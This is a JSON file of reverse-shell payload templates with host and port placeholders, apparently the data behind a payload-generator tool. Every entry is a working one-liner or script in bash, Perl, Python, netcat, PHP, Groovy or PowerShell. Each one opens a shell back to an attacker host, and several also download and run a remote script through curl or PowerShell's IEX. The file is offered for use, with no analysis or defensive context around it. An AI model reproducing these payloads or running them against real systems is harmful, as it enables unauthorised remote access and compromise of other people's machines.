[

	{
		"type": "shell",
		"subtype": "bash",
		"format": "one-liner",
		"os": "linux",
		"template": "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
		"web-delivery": false
	},
	{
		"type": "shell", 
		"subtype": "perl",
		"format": "one-liner",
		"os": "linux",
		"template": "perl -e 'use Socket;$i=\"{LHOST}\";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
		"web-delivery": false
	},
	{
		"type": "shell",
		"subtype": "perl",
		"format": "one-liner",
		"os": "linux",
		"template": "curl http://{LHOST}/rev.pl -o /tmp/rev.pl ; perl /tmp/rev.pl",
		"web-delivery": true
	},
	{
		"type": "perl",
		"subtype": "perl",
		"format": "raw",
		"os": "linux",
		"template": "use Socket;\n$i=\"{LHOST}\";\n$p={LPORT};\nsocket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));\nif(connect(S,sockaddr_in($p,inet_aton($i)))){\n\topen(STDIN,\">&S\");\n\topen(STDOUT,\">&S\");\n\topen(STDERR,\">&S\");\n\texec(\"/bin/sh -i\");\n};",
		"web-delivery": false
	},
	{
		"type": "shell", 
		"subtype": "python",
		"format": "one-liner",
		"os": "linux",
		"template": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
		"web-delivery": false
	},
	{
		"type": "python",
		"subtype": "python",
		"format": "raw",
		"os": "linux",
		"template": "import socket,subprocess,os;\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\ns.connect((\"{LHOST}\",{LPORT}));\nos.dup2(s.fileno(),0);\nos.dup2(s.fileno(),1);\nos.dup2(s.fileno(),2);\np=subprocess.call([\"/bin/sh\",\"-i\"]);",
		"web-delivery": false
	},
	{
		"type": "shell", 
		"subtype": "netcat",
		"format": "one-liner",
		"os": "linux",
		"template": "nc -e /bin/sh {LHOST} {LPORT}",
		"web-delivery": false
	},
	{
		"type": "shell",
		"subtype": "bash",
		"format": "one-liner",
		"os": "linux",
		"template": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f",
		"web-delivery": false
	},
	{
		"type": "shell",
		"subtype": "php",
		"format": "one-liner",
		"os": "linux",
		"template": "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
		"web-delivery": false
	},
	{
		"type": "php",
		"subtype": "php",
		"format": "raw",
		"os": "linux",
		"template": "$sock=fsockopen(\"{LHOST}\",{LPORT});\nexec(\"/bin/sh -i <&3 >&3 2>&3\");",
		"web-delivery": false
	},
	{
		"type": "groovy",
		"subtype": "groovy",
		"format": "raw",
		"os": "linux",
		"template": "String host=\"{LHOST}\";\nint port={LPORT};\nString cmd=\"/bin/sh\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();\nSocket s=new Socket(host,port);\nInputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();\nOutputStream po=p.getOutputStream(),so=s.getOutputStream();\nwhile(!s.isClosed()){\n\twhile(pi.available()>0)so.write(pi.read());\n\twhile(pe.available()>0)so.write(pe.read());\n\twhile(si.available()>0)po.write(si.read());\n\tso.flush();\n\tpo.flush();\n\tThread.sleep(50);\n\ttry {\n\t\tp.exitValue();\n\t\tbreak;\n\t}catch (Exception e){}\n};\np.destroy();\ns.close();",
		"web-delivery": false
	},
	{
		"type": "cmd",
		"subtype": "powershell",
		"format": "one-liner",
		"os": "windows",
		"template": "powershell -Command \"IEX (New-Object System.Net.WebClient).DownloadString('http://{LHOST}/Invoke-PowerShellTcp.ps1'); Invoke-powershellTcp -Reverse -IPAddress {LHOST} -Port {LPORT}\"",
		"web-delivery": true
	},
	{
		"type": "cmd",
		"subtype": "powershell",
		"format": "one-liner",
		"os": "windows",
		"template": "powershell -Command \"IEX (New-Object System.Net.WebClient).DownloadString('http://{LHOST}/powercat.ps1'); powercat -c {LHOST} -p {LPORT} -e cmd\"",
		"web-delivery": true
	},
	{
		"type": "powershell",
		"subtype": "powershell",
		"format": "raw",
		"os": "windows",
		"template": "$c=New-Object System.Net.Sockets.TCPClient(\"{LHOST}\",{LPORT});\n$s=$c.GetStream();\n[byte[]]$b=0..65535|%{0};\nwhile(($i=$s.Read($b, 0, $b.Length)) -ne 0)\n{\n\t$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i-1);\n\t$sb=if($i -gt 1) {$cmd=\"$d 2>&1\"; try {iex $cmd | Out-String} catch {$_ | Out-string}} else{\"\"};\n\t$sb2=$sb+\"PS \"+(pwd).Path+\"> \";\n\t$sdb=([text.encoding]::ASCII).GetBytes($sb2)\n\t$s.Write($sdb,0,$sdb.Length);\n\t$s.Flush()\n};\n$c.Close()",
		"web-delivery": false
	}
]
